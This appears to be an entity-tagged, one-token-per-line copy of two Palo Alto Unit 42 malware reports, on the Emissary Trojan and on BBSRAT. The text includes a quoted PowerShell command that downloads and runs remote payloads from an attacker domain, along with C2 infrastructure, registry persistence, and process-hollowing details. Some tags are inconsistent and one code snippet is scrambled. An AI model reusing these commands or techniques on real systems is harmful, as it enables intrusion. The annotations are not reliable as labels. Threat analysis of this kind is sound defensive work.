http://ustar5.PassAs[.]us/default.aspx B_url.unknown

C2
Server
2
:
http://203.124.14.229/default.aspx B_url.unknown

C2
Server
3
:
http://dnt5b.myfw[.]us/default.aspx B_url.unknown

Campaign
Code
:
UPG­ZHG­01

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

13/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

Sleep
Delay
:
300

After
decrypting
the
configuration
file
,
Emissary B_malware.backdoor
interacts
with
its
command
and
control
(
C2
)
servers
using
HTTP
or
HTTPS
,
depending
on
the
protocol
specified
in
the
configuration
file
.

The
initial
network
beacon
sent
from
Emissary B_malware.backdoor
to
its
C2
server
,
seen
in
Figure
7
,
includes
a
Cookie
field
that
contains
a
'
GUID
'
,
'
op
'
and
'
SHO
'
field
.
The
GUID
field
is
a
unique
identifier
for
the
compromised
system
that
is
obtained
directly
from
the
configuration
file
.

The
op
field
has
a
value
of
'
101
'
,
which
is
a
static
value
that
represents
the
initial
network
beacon
.

The
SHO
field
contains
the
external
IP
address
of
the
infected
system
,
which
Emissary B_malware.backdoor
obtains
from
a
legitimate
website
'
showip.net
'
,
specifically
parsing
the
website's
response
for
'
<input
id='checkip
'
type='text
'
name='check_ip
'
value=
'
,
which
contains
the
IP
address
of
the
system
.

Figure
7
Network
beacon
sent
from
Emissary B_malware.backdoor
Trojan
to
C2
server

The
C2
server
response
to
this
beacon
(
seen
in
Figure
8
)
will
contain
a
header
field
called
'
Set­
-
Cookie
'
,
which
contains
a
value
of
'
SID
'
.

The
SID
value
is
base64
encoded
and
encrypted
using
a
rolling
XOR
algorithm
,
which
once
decoded
and
decrypted
contains
a
36­character
GUID
value
.

The
Emissary B_malware.backdoor
Trojan
will
use
this
GUID
value
provided
by
the
C2
server
as
an
encryption
key
that
it
will
use
to
encrypt
data
sent
in
subsequent
network
communications
.

Figure
8
C2
response
to
Emissary B_malware.backdoor
beacon

The
C2
server
provides
commands
to
the
Trojan
as
a
three
digit
numeric
string
within
the
data
portion
of
the
HTTP
response
(
in
the
form
of
'
op=<command>
'
)
,
which
the
Emissary B_malware.backdoor
Trojan
will
decrypt
and
compare
to
a
list
of
commands
within
its
command
handler
.

The
command
handler
function
within
the
Emissary B_malware.backdoor
Trojan
supports
six
commands
,
as
seen
in
Table
2
.

Command

Description

Upload
a
file
to
the
C2
server
.

Executes
a
specified
command
.

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

14/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

Download
file
from
the
C2
server
.

Update
configuration
file
.

Create
a
remote
shell
.

Updates
the
Trojan
with
a
new
executable
.

Table
2
Command
handler
within
Emissary B_malware.backdoor
version
5.3

If
the
command
issued
from
the
C2
server
does
not
match
the
one
listed
in
the
Trojan
saves
the
message
'
unkown:%s
'
to
the
log
file
.

The
command
set
available
within
Emissary B_malware.backdoor
allows
the
threat
actors
backdoor
access
to
a
compromised
system
.

Using
this
access
,
the
threat
actors
can
exfiltrate
data
and
carry
out
further
activities
on
the
system
,
including
interacting
directly
with
the
system's
command
shell
and
downloading
and
executing
additional
tools
for
further
functionality
.

Threat
Infrastructure

The
infrastructure
associated
with
the
Emissary B_malware.backdoor
C2
servers
used
in
this
attack
includes
ustar5.PassAs[.]us B_url.unknown
,
203.124.14.229 B_ip.unknown
and
dnt5b.myfw[.]us B_url.unknown
.

The
infrastructure
is
rather
isolated
as
the
only
overlap
in
domains
includes
appletree.onthenetas[.]com B_url.unknown
.

The
overlap
,
as
seen
in
Figure
9
involves
two
IP
addresses
that
during
the
same
time
frame
resolved
both
the
appletree.onthenetas[.]com B_url.unknown
domain
and
the
Emissary B_malware.backdoor
C2
domain
of
ustar5.PassAs[.]us B_url.unknown
.

The
other
C2
domain
used
by
this
Emissary B_malware.backdoor
payload
,
specifically
dnt5b.myfw[.]us B_url.unknown
currently
resolves
to
the
127.0.0.1 B_ip.unknown
.

This
provides
another
glimpse
into
TTPs
for
these
threat
actors
,
as
it
suggests
that
the
threat
actors
set
the
secondary
C2
domains
to
resolve
to
the
localhost
IP
address
to
avoid
network
detection
and
change
this
to
a
routable
IP
address
when
they
need
the
C2
server
operational
.

Additionally
,
while
this
infrastructure
does
not
overlap
with
that
used
in
Operation
Lotus B_malware.drop
Blossom I
,
that
also
fits
with
the
TTPs
.

In
each
case
,
the
threat
actors
used
separate
infrastructure
for
different
targets
,
another
way
to
help
avoid
detection
.

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

15/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

Figure
9
Infrastructure
associated
with
Emissary B_malware.backdoor
Trojan

Conclusion

APT
threat
actors
,
most
likely
nation
state­sponsored
,
targeted
a
diplomat
in
the
French
Ministry
of
Foreign
Affairs
with
a
seemingly
legitimate
invitation
to
a
technology
conference
in
Taiwan
.

It
is
entirely
possible
the
diplomat
was
truly
invited
to
the
conference
,
or
at
least
would
not
have
been
surprised
by
the
invitation
,
adding
to
the
likelihood
the
attachment
would
have
been
opened
.

The
actors
were
attempting
to
exploit
CVE­2014­6332
to
install
a
new
version
of
the
Emissary B_malware.backdoor
Trojan
,
specifically
version
5.3
.

The
Emissary B_malware.backdoor
Trojan
is
related
to
the
Elise B_malware.backdoor
malware
used
in
Operation
Lotus B_malware.drop
Blossom I
,
which
was
an
attack
campaign
on
targets
in
Southeast
Asia
,
in
many
cases
also
with
official
looking
decoy

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

16/17

08/02/2016

Attack
on
French
Diplomat
Linked
to
Operation
Lotus B_malware.drop
Blossom I
­-
Palo
Alto
Networks
Blog

documents
that
do
not
appear
to
have
been
available
online
.

Additionally
,
the
targeting
of
a
French
diplomat
based
in
Taipei
,
Taiwan
aligns
with
previous
targeting
by
these
actors
,
as
does
the
separate
infrastructure
.

Based
on
the
targeting
and
lures
,
Unit
42
assesses
that
the
threat
actors
'
collection
requirements
not
only
include
militaries
and
government
agencies
in
Southeast
Asia
,
but
also
nations
involved
in
diplomatic
and
trade
agreements
with
them
.

Indicators

Related
Hashes

748feae269d561d80563eae551ef7bfd B_hash
-
­書面報名表格.doc

9fd6f702763a9840bd1b3a898eb9c62d B_hash
-
­蔡英文柯建銘全國科技後援會邀請函.doc

06f1d2be5e981dee056c231d184db908 B_hash
–
ishelp.dll

6278fc8c7bf14514353797b229d562e8 B_hash
–
A08E81B411.DAT

e9f51a4e835929e513c3f30299567abc B_hash
–
75BD50EC.DAT

Command
and
Control

203.124.14.229 B_ip.unknown

ustar5.PassAs[.]us B_url.unknown

appletree.onthenetas[.]com B_url.unknown

dnt5b.myfw[.]us B_url.unknown

http://researchcenter.paloaltonetworks.com/2015/12/attack­on­french­diplomat­linked­to­operation­lotus­blossom/ B_ip.normal

17/17
4/3/2016

Home

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

Blog
Home

Applipedia

Threat
Vault

Reports

Tools

English

1.866.320.4788

Support

Resources

Research

Search

Like

Tweet

Search

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I

posted
by
:
Bryan
Lee
and
Josh
Grunzweig
on
December
22
,
2015
5:00
PM

filed
in
:
Malware
,
Unit
42

tagged
:
AutoFocus
,
BBSRAT B_malware.drop
,
Microsoft
Office
,
PlugX
,
Roaming B_malware.infosteal
Tiger I

In
late
2014
,
ESET
presented
an
attack
campaign
that
had
been
observed
over
a
period
of
time
targeting
Russia
and
other
Russian
speaking
nations
,
dubbed
'
Roaming B_malware.infosteal
Tiger I
'
.

The
attack
was
found
to
heavily
rely
on
RTF
exploits
and
at
the
time
,
thought
to
make
use
of
the
PlugX
malware
family
.

ESET
did
not
attribute
the
attacks
to
a
particular
attack
group
,
but
noted
that
the
objective
of
the
campaign
was
espionage
and
general
information
stealing
.

Based
on
data
collected
from
Palo
Alto
Networks
AutoFocus
threat
intelligence
,
we
discovered
continued
operations
of
activity
very
similar
to
the
Roaming B_malware.infosteal
Tiger I
attack
campaign
that
began
in
the
August
2015
timeframe
,
with
a
concentration
of
attacks
in
late
October
and
continuing
into
December
.

The
adversaries
behind
these
attacks
continued
to
target
Russia
and
other
Russian
speaking
nations
using
similar
exploits
and
attack
vectors
.

However
,
while
the
malware
used
in
these
new
attacks
uses
similar
infection
mechanisms
to
PlugX
,
it
is
a
completely
new
tool
with
its
own
specific
behavior
patterns
and
architecture
.

We
have
named
this
tool
'
BBSRAT B_malware.drop
.
'

Targeting
and
Infrastructure

As
described
in
earlier
reports
on
'
Roaming B_malware.infosteal
Tiger I
'
,
the
attack
observed
in
August
2015
used
weaponized
exploit
documents
that
leave
Russian
language
decoy
document
files
after
infecting
the
system
.

The
files
exploit
the
well­known
Microsoft
Office
vulnerability
,
CVE­2012­0158
,
to
execute
malicious
code
in
order
to
take
control
of
the
targeted
systems
.

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

1/12

4/3/2016

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

Figure
1
Spear­phishing
email
delivering
BBSRAT B_malware.drop

In
one
case
,
the
adversary
impersonated
an
individual
from
the
organization
Vigstar
,
a
Russian­based
research
organization
in
charge
of
the
development
of
satellite
communications
and
special
purpose
wireless
devices
for
the
Russian
Federation's
defense
and
security
agencies
.

The
targeted
email
address
appeared
to
be
a
Gmail
account
associated
with
Vigstar
as
well
,
and
was
found
on
a
job
board
website
for
a
job
opening
at
Vigstar
.

The
rough
translation
of
the
body
of
the
email
is
as
follows
:

I
send
you
a
'
list
of
international
exhibitions
of
military
,
civil
and
dual­purpose
,
conducted
in
2015
on
the
territory
of
the
Russian
Federation
and
foreign
states
.

'
Waiting
for
your
reply
!

Figure
2
confirms
that
the
decoy
document
that
opens
after
the
malware
infects
the
system
is
indeed
a
list
of
international
exhibitions
that
were
conducted
on
Russian
territory
in
2015
.

Figure
2
Decoy
document
that
is
opened
after
the
malicious
document
has
infected
the
system
In
more
recent
months
,
we
have
identified
several
other
potential
Russian
victims
using
AutoFocus
.

Analysis
of
the
command
and

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

2/12

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

control
(
C2
)
infrastructure
shows
that
the
newly
discovered
samples
of
BBSRAT B_malware.drop
used
the
same
C2
domains
as
previously
published
in
the
'
Roaming B_malware.infosteal
Tiger I
'
campaign
,
including
transactiona[.]com B_url.cncsvr
and
futuresgold[.]com B_url.cncsvr
.

Interestingly
,
all
of
the
previously
published
C2
domains
have
significant
overlap
amongst
the
hashes
and
IPs
while
C2s
for
BBSRAT B_malware.drop
contain
no
overlap
at
all
.

This
may
indicate
that
for
the
newer
attack
campaign
using
BBSRAT B_malware.drop
,
the
adversary
may
have
deployed
purpose­built
variants
and
/
or
infrastructure
for
each
of
the
intended
targets
.

Figure
3
Command
and
control
infrastructure

BBSRAT B_malware.drop
Malware
Analysis

Deployment
Technique
#1

BBSRAT B_malware.drop
is
typically
packaged
within
a
portable
executable
file
,
although
in
a
few
of
the
observed
instances
,
a
raw
DLL
was
discovered
to
contain
BBSRAT B_malware.drop
.

When
the
dropper
first
runs
,
it
will
generate
a
path
in
the
%TEMP%
directory
.

The
generated
filename
is
10­16
uppercase
alphabetic
characters
,
and
ends
with
a
'
.TMP
'
file
extension
.

The
dropper
will
continue
to
write
an
embedded
cab
file
in
this
location
.

Figure
4
Header
of
CAB
file
dropped
by
BBSRAT B_malware.drop

The
malware
will
proceed
to
create
one
of
the
following
directories
depending
on
what
version
of
Microsoft
Windows
is
running
on
the
target
machine
:

%ALLUSERSPROFILE%\SSONSVR

%ALLUSERSPROFILE%\Application
Data\SSONSVR

Using
the
built­in
expand.exe
utility
provided
by
Microsoft
Windows
,
the
dropper
executes
the
following
command
,
which
will

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-Roaming-tiger/ B_url.normal

3/12

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

expand
the
CAB
file
and
write
the
results
to
the
provided
directory
:
expand.exe
'
%TEMP%\[temp_file]
'
Destination
'
[chosen_path]\SSONSVR
'

This
results
in
the
following
three
files
being
written
to
the
SSONSVR
directory
:

aclmain.sdb

pnipcn.dll

ssonsvr.exe

The
'
ssonsvr.exe
'
file
is
a
legitimate
Citrix
executable
that
will
be
used
to
sideload
the
malicious
'
pnipcn.dll
'
file
.
The
'
aclmain.sdb
'
file
contains
code
that
will
eventually
be
loaded
by
the
'
pnipcn.dll
'
file
.

The
malware
finally
executes
'
ssonsvr.exe
'
via
a
call
to
ShellExecuteW
.

Figure
5
Execution
flow
of
dropper
expanding
CAB
file

When
'
ssonsvr.exe
'
is
executed
,
and
the
pnipcn.dll
file
is
loaded
,
it
will
begin
by
identifying
the
path
to
msiexec.exe
,
by
expanding
the
following
environment
string
:
%SystemRoot%\System32\msiexec.exe

It
will
then
spawn
a
suspended
instance
of
msiexec.exe
in
a
new
process
.

The
malware
proceeds
to
load
code
from
the
'
aclmain.sdb
'
file
and
performs
process
hollowing
against
this
instance
of
msiexec.exe
prior
to
resuming
the
process
.

Figure
6
Sideloading
execution
flow

In
order
to
ensure
persistence
,
the
following
registry
key
is
written
on
the
victim's
machine
:

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ssonsvr.exe
:
[path_to_ssonsvr.exe]

Deployment
Technique
#2

In
the
most
recently
observed
sample
of
BBSRAT B_malware.drop
found
in
AutoFocus
,
the
Trojan
was
deployed
via
a
downloader
that
used
the
Invoke­ReflectivePEInjection.ps1
script
from
the
PowerSploit
framework
.

When
the
downloader
executes
,
it
will
first
decrypt
the
following
two
strings
using
a
5­byte
XOR
key
of
'
\x01\x02\x03\x04\x05
'
:
'
powershell
­exec
bypass
­c
IEX
(
New­Object
Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke­
ReflectivePEInjection
­PEUrl
http://testzake[.]com/s.exe
'
'
C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell
­exec
bypass
­c
IEX
(
New­Object
Net.WebClient).DownloadString('http://testzake[.]com/IR.ps1');Invoke­ReflectivePEInjection
­PEUrl
http://testzake[.]com/s.exe
'

These
strings
are
then
sequentially
executed
via
calls
to
WinExec
.

As
we
can
see
,
the
second
command
is
specifically
crafted
to
run
on
64­bit
versions
of
Microsoft
Windows
.

The
commands
in
question
will
download
an
executable
file
and
run
it
within
the
context
of
the
powershell
process
.

When
the
above
commands
are
executed
,
the
downloader
will
initially
download
the
'
IR.ps1
'
powershell
script
from
the
specified

URL
:

Figure
7
Downloader
downloading
the
Invoke­ReflectivePEInjection
PowerSploit
script

This
Powershell
script
appears
to
have
been
pulled
directly
from
the
PowerSploit
framework
,
with
no
modifications
made
.

The
malware
then
invokes
this
script
with
a
URL
that
points
to
an
additional
executable
file
.

This
downloaded
executable
contains
a
copy
of
the
BBSRAT B_malware.drop
malware
family
.

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

4/12

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

The
downloader
proceeds
to
drop
either
a
32­bit
or
64­bit
DLL
file
that
will
execute
the
two
previously
stated
Powershell
commands
when
the
DLL
is
loaded
.

This
DLL
is
dropped
to
one
of
the
following
locations
:

%SYSTEMROOT%\web\srvcl32.dll

%APPDATA%\web\srvcl32.dll

Additionally
,
the
following
registry
keys
are
set
depending
on
the
system's
CPU
architecture
:

HKU\Software\Classes\CLSID\{42aedc87­2188­41fd­b9a3­0c966feabec1}\InprocServer32\ThreadingModel
–
'
Both
'

HKU\Software\Classes\CLSID\{42aedc87­2188­41fd­b9a3­0c966feabec1}\InprocServer32\Default
–
[path_to_srvcl32.dll]

HKLM\SOFTWARE\Classes\CLSID\{F3130CDB­AA52­4C3A­AB32­85FFC23AF9C1}\InprocServer32\ThreadingModel
–
'
Both
'

HKLM\SOFTWARE\Classes\CLSID\{F3130CDB­AA52­4C3A­AB32­85FFC23AF9C1}\InprocServer32\Default
–
[path_to_srvcl32.dll]

The
COM
object
for
{42aedc87­2188­41fd­b9a3­0c966feabec1}
is
specific
to
'
MruPidlList
'
,
while
the
COM
object
for
{F3130CDB­
AA52­4C3A­AB32­85FFC23AF9C1}
is
specific
to
'
Microsoft
WBEM
New
Event
Subsystem
'
.

This
ensures
that
the
DLL
specified
will
load
when
Microsoft
Windows
starts
.

It
is
a
technique
that
was
used
by
the
ZeroAccess
rootkit
when
it
initially
surfaced
.

BBSRAT B_malware.drop
Execution

After
being
loaded
using
one
of
the
two
techniques
discussed
,
BBSRAT B_malware.drop
malware
begins
execution
by
loading
the
following
libraries
at
runtime
:

ntdll.dll

kernel32.dll

user32.dll

advapi32.dll

gdi32.dll

ws2_32.dll

shell32.dll

psapi.dll

Secur32.dll

WtsApi32.dll

Netapi32.dll

Version.dll

Crypt32.dll

Wininet.dll

The
following
mutex
is
then
created
to
ensure
a
single
instance
of
BBSRAT B_malware.drop
is
running
at
a
given
time
:

Global\GlobalAcProtectMutex

Throughout
the
execution
of
BBSRAT B_malware.drop
,
it
will
dynamically
load
functions
prior
to
calling
them
,
as
seen
in
the
example
below
demonstrating
BBSRAT B_malware.drop
making
a
call
to
the
WSAStartup
function
:

Figure
8
BBSRAT B_malware.drop
calling
WSAStartup
function

The
malware
proceeds
to
parse
the
stored
embedded
network
configuration
and
spawns
a
series
of
threads
responsible
for
network
communication
.

This
includes
a
series
of
HTTP
or
HTTPS
requests
,
such
as
the
following
:

GET
/bbs/1/forum.php?sid=1
HTTP/1.1

Cookie
:
A46A8AA9­D7D6­43FB­959DC96E

Content­Length
:

User­Agent
:
Mozilla/4.0
(
compatible;
Windows
NT
5.1
)

Connection
:
Keep­Alive

Host
:
transactiona[.]com B_url.cncsvr

Cache­Control
:
no­cache

Accept
:
*/*

Content­Type
:

In
the
above
example
,
the
'
1
'
used
both
in
the
URI
and
the
sid
GET
parameter
is
a
global
incremental
counter
.

Every
subsequent
request
made
by
BBSRAT B_malware.drop
increments
this
counter
by
one
.

Additionally
,
all
variants
of
BBSRAT B_malware.drop
we
have
found
use
the
same
URL

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

5/12

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

4/3/2016

for
command
and
control
(
C2
)
communication
.

When
first
executed
,
the
malware
will
exfiltrate
data
about
the
victim's
machine
via
a
POST
request
to
the
'
/bbs/[counter]/forum.php?sid=[counter]
'
URL
.

All
network
data
sent
via
POST
requests
uses
a
custom
binary
structure
,
as
defined
as
the
following
:

struct
network_header

DWORD
random;

DWORD
hardcoded0;

DWORD
hardcoded1;

DWORD
command;

DWORD
length_of_compressed_data;

DWORD
length_of_decompressed_data;

DWORD
unknown2;

BYTE
compressed_data[];

The
compressed_data
field
is
compressed
using
the
common
ZLIB
compression
algorithm
.

Additionally
,
in
the
event
data
is
being
sent
via
HTTP
rather
than
HTTPS
,
the
following
additional
encryption
algorithm
is
applied
to
the
POST
data
:

def
decrypt(data
)
:
out
=
[]
for
x
in
data
:
return
out
t
=
(
ord(x
)
-
23
)
t1
=
(
t
^
62
)
t2
=
(
t1
+
23
)
&
0xFF
out.append(chr(t2
)
)

The
following
data
structure
holds
the
victim's
information
that
is
uploaded
by
BBSRAT B_malware.drop
:

struct
victim_information

DWORD
static_value;

DWORD
major_version;

DWORD
minor_version;

DWORD
build_number;

DWORD
platform_id;

DWORD
default_locale;

DWORD
unknown;

DWORD
local_ip_address;

DWORD
running_as_64_bit;

DWORD
random;

DWORD
unknown2;

DWORD
struct_length;

DWORD
struct_with_not_used_length;

DWORD
struct_with_username_length;

DWORD
struct_with_group_length;

DWORD
unknown3;

DWORD
struct_with_hostname_length;

WCHAR
not_used[??];

WCHAR
username[??];

WCHAR
group[??];

WCHAR
hostname[??];

BBSRAT B_malware.drop
accepts
many
possible
commands
that
the
C2
server
can
provide
.

These
commands
are
sent
as
a
response
to
the
GET
beacons
that
are
continually
requested
via
either
HTTP
or
HTTPS
.

The
following
commands
and
sub­commands
have
been
identified
:

CommandSub­

Description

command

0x110010
N/A

Beacon

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

6/12

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

Uninstall/Kill
Malware

Upload
Victim
Information

Execute
Command
and
Return
Response

Unknown

Execute
Shellcode

Query
Service
Configuration

Start
Service

Stop
Service

Delete
Service

Change
Service
Configuration

Enumerate
Running
Processes

Kill
Process

Get
Process
Information

Free
Library
for
Specified
Process

Execute
Command
Quietly

Send
Input
to
Console

Execute
Shellcode

List
Drive
Information

List
File
Information
For
Given
Directory

Write
File

Read
File

List
File
Information
For
Given
Directory

Perform
File
Operation
via
SHFileOperation(
)

Delete
File

Create
Directory

Shell
Execute

4/3/2016

0x110011
N/A

0x110020
N/A

0x110064
0x2

0x110064
0x4

0x110064
0x5

0x110066
0x7

0x110066
0x9

0x110066
0xa

0x110066
0xb

0x110066
0xc

0x110063
0xd

0x110063
0xf

0x110063
0x10

0x110063
0x12

0x110065
0x1b

0x110065
0x1e

0x110065
0x1f

0x110061
0x20

0x110061
0x21

0x110061
0x23

0x110061
0x24

0x110061
0x25

0x110061
0x27

0x110061
0x28

0x110061
0x29

0x110061
0x2a

Please
refer
to
the
appendix
for
a
full
list
of
identified
BBSRAT B_malware.drop
samples
and
their
associated
C2
servers
.

Conclusion

As
in
many
of
the
previous
articles
regarding
espionage­motivated
adversaries
and
possible
nation­state
campaigns
,
what
is
being
observed
in
this
attack
campaign
is
a
continued
operation
and
evolution
by
the
adversary
even
after
its
tactics
,
techniques
,
and
procedures
(
TTPs
)
have
become
public
knowledge
.

Despite
the
fact
that
the
information
about
these
attackers
has
been
public
for
over
a
year
,
including
a
listing
of
many
of
the
command
and
control
servers
,
they
continue
to
reuse
much
of
their
exposed
playbook
.

We
urge
organizations
to
use
the
data
from
Unit
42
and
other
threat
intelligence
sources
is
paramount
to
proactively
secure
themselves
and
prevent
attacks
.

WildFire
properly
classifies
BBSRAT B_malware.drop
malware
samples
as
malicious
.

We
have
released
DNS
signatures
to
block
access
to
the
C2
domain
names
included
in
this
report
.

AutoFocus
users
can
explore
these
attacks
using
the
BBSRAT B_malware.drop
malware
family
tag
.

Appendix B_hash

YARA
Rule

meta
:
author
=
'
Tyler
Halfpop
'
company
=
'
Palo
Alto
Networks
'
last_updated
=
'
12-16-15
'
rule
BBSRAT B_malware.drop
{
strings
:
condition
:
$sa0
=
'
%ALLUSERSPROFILE%\\SSONSVR
'
fullword
wide
$sa1
=
'
%ALLUSERSPROFILE%\\Application
Data\\SSONSVR
'
fullword
wide
$sa2
=
'
\\ssonsvr.exe
'
fullword
wide
$oa0
=
{
83
E8
01
88
0C
04
75
F8
8B
44
24
40
89
4C
24
18
89
4C
24
1C
89
4C
24
30
89
$oa1
=
{
75
11
5F
5E
B8
0D
00
00
00
5B
81
C4
?
?
07
00
00
C2
10
00
53
68
80
00
00
00
$sb0
=
'
%systemroot%\\Web\\
'
$sb1
=
'
srvcl32.dll
'
$ob0
=
{
B8
67
66
66
66
F7
E9
D1
FA
8B
C2
C1
E8
1F
03
C2
8D
04
80
8B
D1
2B
D0
8A
44
$ob1
=
{
8D
84
24
18
02
00
00
50
C7
84
24
1C
02
00
00
94
00
00
00
FF
15
4C
20
40
00
uint16(0
)
==
0x5a4d
and
filesize
<
300KB
and
(
all
of
(
$sa*
)
or
all
of
(
$oa*
)
or
all

BBSRAT B_malware.drop
Samples

SHA1

EF5FA2378307338D4E75DECE88158D77 B_hash
(
Sample
Analyzed
)

574230D89EABDE0B6F937CD718B3AD19BB4F5CE3  B_hash

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

7/12

HTTPS

2014­12­26
17:17:00
UTC

transactiona[.]com B_url.cncsvr

financenewsru[.]net B_url.cncsvr

4/3/2016

SHA256

FC4B465EE8D2053E9E41FB0A6AE32843E4E23145845967A069E584F582279725 B_hash

Compile
Time

Network
Protocol

Server(s
)

SHA1

SHA256

567A5B54D6C153CDD2DDD2B084F1F66FC87587DD691CD2BA8E30D689328A673F B_hash

Compile
Time

Network
Protocol

Server(s
)

2254A1CA05DB87D9D58A71DDB97C7395 B_hash

65B17D3FF68D25392A9B0B9E25A275540DFB4E8D B_hash

2015­11­04
07:14:33
UTC

HTTPS

jowwln[.]cocolco[.]com B_ip.cncsvr
pagbine[.]ofhloe[.]com B_ip.cncsvr
cdaklle[.]housejjk[.]com B_ip.cncsvr

HTTPS

HTTPS

kop[.]gupdiic[.]com B_ip.cncsvr

2015­11­04
07:14:33

herman[.]eergh[.]com B_ip.cncsvr

2015­11­04
07:14:33
UTC

74A41C62D9EC1164AF82B802DA3E8B3E B_hash

D390E0965823E42584F2799EF0E8161A6540AF3E B_hash

C17534E4B61C08A7646CDC64574B429B B_hash

931BAB999568C228616430A5AEDFEDFC34E1F151 B_hash

SHA1

SHA256

77A2E26097285A794E42C9E813D14936D0E7A1DD3504205DD6B28A71626F8C3C B_hash

Compile
Time

Network
Protocol

Server(s
)

SHA1

SHA256

61A692E615E31B97B47A215479E6347FBD8E6E33D7C9D044766B4C1D1AE1B1FB B_hash

Compile
Time

Network
Protocol

Server(s
)

SHA1

SHA256

B1737F3A1C50CB39CD9938D5EC3B4A6A10B711F17E917886481C38967B93E259 B_hash

Compile
Time

Network
Protocol

Server(s
)

SHA1

SHA256

56D878EDD61176CA30D4A41555671161158E94E8A50E5482985F42C4E4843CB5 B_hash

Compile
Time

Network
Protocol

Server(s
)

0EA888E970345B2FBFD74B369FE46DDD B_hash

EB4F9BDE2FFAE863E0D7AD5848A758D59224C3F7 B_hash

C7C79393E762E7ED925F42D3C899BA60 B_hash

7406B11851200D0ADA1A8334107182D636738CE5 B_hash

2015­08­25
09:33:57
UTC

HTTPS

HTTP

211.44.42[.]55 B_ip.cncsvr

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

crew[.]wichedgecrew[.]com B_ip.cncsvr

blueway[.]garmio­drive[.]com B_ip.cncsvr

helloway[.]floretdog[.]com B_ip.cncsvr

FA944818A939456A7B6170326C49569F B_hash

0EB3AE28A7A7D97ABA30DA4E8EB0A4AB36EFD035 B_hash

SHA1

SHA256

22592A32B1193587A707D8B20C04D966FE61B37F7DEF7613D9BB91FF2FE9B13B B_hash

Compile
Time

http://researchcenter.paloaltonetworks.com/2015/12/bbsrat-attacks-targeting-russian-organizations-linked-to-roaming-tiger/ B_url.normal

2015­08­25
09:33:57
UTC
8/12

BBSRAT B_malware.drop
Attacks
Targeting
Russian
Organizations
Linked
to
Roaming B_malware.infosteal
Tiger I
-
Palo
Alto
Networks
BlogPalo
Alto
Networks
Blog

HTTPS

4/3/2016

Network
Protocol

Server(s
)

panaba[.]empleoy­plan[.]com B_ip.cncsvr

kop[.]gupdiic[.]com B_ip.cncsvr

peak[.]measurepeak[.]com B_ip.cncsvr

HTTP

211.44.42[.]55 B_ip.cncsvr

896691AE546F498404F5884607D6EB50 B_hash

91A176EB5B2436762B9898075EC66042E33615A3 B_hash

A78B9438117963A9A18B2F056888498B B_hash

98E79C065DB88B4686AB5B7C36C4524333D64C48 B_hash

SHA1

SHA256

13D0BD83A023712B54C1DD391DFC1BC27B22D9DF4FE3942E2967EC82D7C95640 B_hash

Compile
Time

Network
Protocol

Server(s
)

SHA1

SHA256

E049BD90028A56B286F4B0B9062A8DF2AB2DDF492764E3962F295E9CE33660E3 B_hash

Compile
Time

Network
Protocol

Server(s
)

SHA1

SHA256

2D81D65D09BF1B864D8964627E13515CEE7DEDDFBD0DC70B1E67F123AB91421E B_hash

Compile
Time

Network
Protocol

Server(s
)

B4927EAC9715014E17C53841FEEDF4E1 B_hash

26E8CFD13175B67C12FC72A11FBDBC749F0B61C0 B_hash

211.44.42[.]55 B_ip.cncsvr

support.yandexmailru[.]kr

2014­12­26
17:17:00
